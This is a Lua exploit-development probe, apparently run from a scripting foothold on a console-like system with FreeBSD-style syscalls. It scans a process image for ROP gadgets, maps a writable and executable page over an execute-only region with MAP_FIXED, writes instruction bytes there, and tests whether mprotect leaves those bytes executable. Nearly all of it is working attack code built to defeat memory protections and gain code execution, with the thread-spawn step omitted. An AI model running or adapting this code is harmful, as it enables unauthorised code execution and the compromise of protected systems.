-- CRASH_CLASS: HIGH
-- PROBE 953a: write, then mprotect(X) on a MAP_FIXED replacement of an
-- execute-only VM entry
--
-- 951a/952a: MAP_FIXED over an entry sys 547 reports as prot 4 (execute-only)
-- returns the target, accepts a write, and 547 still reports prot 4 - but a
-- thread started there dies. So the entry keeps X in its record while the
-- page table entry is RW.
--
-- If the entry's max_prot really is 4, then mprotect(target, PAGE, 4) is a
-- legal downgrade and must succeed. The sequence write -> mprotect(4) would
-- then leave our bytes in an executable page.
--
--   [A] find an execute-only page, MAP_FIXED R|W|X, prove the write
--   [B] read bytes +8..+16 to see whether the page was replaced (zeros) or kept
--   [C] mprotect(target, PAGE, 4) and report the return
--   [D] control spawn (store gadget), then spawn at the page (last: a fault is fatal)

print("=== PROBE 953a: MAP_FIXED + mprotect(X) ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function alive() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(alive()) .. string.format(" fn=%X", fn))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0) * 4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] ebase=%X rax=%X rdi=%X store=%X jmp=%X", ebase,
    pop_rax or 0, pop_rdi or 0, store or 0, jmp_g or 0))
if not (pop_rax and pop_rdi and store and jmp_g) then print("[!] no gadgets"); return end

local PAGE = 0x4000
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8,
             SS=0x100, RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}
local ctx  = memory.alloc(0x500)
local tb   = memory.alloc(8)
local out1 = memory.alloc(8)
local out2 = memory.alloc(8)
local out3 = memory.alloc(8)
local ts   = memory.alloc(16)
local eout = memory.alloc(0x20)

local function mmap(px, prot, flags, addr)
    local ok, a = pcall(function()
        return mk(477)(uint64(addr or 0), uint64(px), uint64(prot), uint64(flags),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return 0 end
    return to_num(a)
end
local function mprot(addr, px, prot)
    local ok, rv = pcall(function() return mk(74)(uint64(addr), uint64(px), uint64(prot)) end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end
local function sleep_ms(ms)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end
local function entry(addr)
    zero(eout, 0x20)
    local ok, rv = pcall(function() return mk(547)(uint64(addr), uint64(eout)) end)
    if not ok or to_num(rv) ~= 0 then return nil end
    return rq(eout), rq(eout + 8), rq(eout + 0x10)
end

print("--- A: MAP_FIXED R|W|X over an execute-only page ---")
local target = nil
for _, delta in ipairs({0x440000, 0x400000, 0x300000, 0x200000}) do
    local t = (ebase + delta) - ((ebase + delta) % PAGE)
    local s, e, w = entry(t)
    if s then
        print(string.format("  page 0x%X start=0x%X end=0x%X prot=0x%X", t, s, e, w % 0x100000000))
        if (w % 0x100000000) == 4 and not target then target = t end
    else
        print(string.format("  page 0x%X 547 failed", t))
    end
end
if not target then print("[!] no execute-only page"); return end
local got = mmap(PAGE, 7, 0x1002 + 0x10, target)
print(string.format("  target=0x%X mmap ret=0x%X", target, got))
wb(target, 0x48); wb(target + 1, 0x89); wb(target + 2, 0x07); wb(target + 3, 0xC3)
print(string.format("  self write read back %X", rd(target) or 0))
local a1, a2, a3 = entry(target)
print(string.format("  entry after mmap: prot=0x%X", (a3 or 0) % 0x100000000))
print("")

print("--- B: was the page really replaced? bytes +8..+16 ---")
print(string.format("  qword +8 = 0x%X  qword +0x10 = 0x%X", rq(target + 8) or 0, rq(target + 0x10) or 0))
print("")

print("--- C: mprotect(target, PAGE, 4) ---")
print(string.format("  mprotect(4) ret=%s", tostring(mprot(target, PAGE, 4))))
local b1, b2, b3 = entry(target)
print(string.format("  entry after mprotect(4): start=%s prot=0x%X", tostring(b1), (b3 or 0) % 0x100000000))
print(string.format("  mprotect(5) ret=%s", tostring(mprot(target, PAGE, 5))))
print(string.format("  mprotect(6) ret=%s", tostring(mprot(target, PAGE, 6))))
print("")

print("=== PROBE 953a COMPLETE (spawn section omitted: a fault is fatal) ===")
